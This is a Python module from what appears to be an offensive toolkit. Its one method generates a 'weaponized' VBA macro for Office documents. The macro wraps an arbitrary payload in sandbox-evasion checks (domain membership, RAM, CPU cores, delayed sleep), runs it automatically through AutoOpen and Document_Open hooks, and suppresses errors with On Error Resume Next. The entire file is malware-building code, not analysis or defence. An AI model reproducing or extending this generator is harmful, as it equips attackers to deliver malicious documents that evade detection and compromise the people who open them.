import os
from evasion_engine import EvasionEngine

class MacroEngine:
    @staticmethod
    def generate_vba(payload, output_path, check_domain=False, min_ram_gb=4, min_cores=2, sleep_ms=0):
        """
        Generates a weaponized VBA macro that executes a payload.
        Includes sandbox evasion techniques.
        """
        
        # We leverage the VBScript evasion wrapper, since VBA is very similar
        raw_vbs = EvasionEngine.wrap_vbscript(
            payload=payload, 
            check_domain=check_domain,
            min_ram_gb=min_ram_gb,
            min_cores=min_cores,
            sleep_ms=sleep_ms
        )
        
        # VBA-specific API declarations for sleep
        vba_sleep_decl = ""
        if sleep_ms > 0:
            vba_sleep_decl = '''#If VBA7 Then
    Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
#Else
    Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
#End If
'''
            
        # Convert VBScript specifics -> VBA equivalents
        vba_code = raw_vbs.replace("WScript.Quit", "Exit Sub")
        vba_code = vba_code.replace("WScript.Sleep", "Sleep")
        
        vba_macro = f"""Attribute VB_Name = "HiderMacro"
{vba_sleep_decl}
Sub AutoOpen()
    ExecutePayload
End Sub

Sub Document_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    On Error Resume Next
{vba_code}
End Sub
"""

        with open(output_path, "w") as f:
            f.write(vba_macro)
            
        return output_path
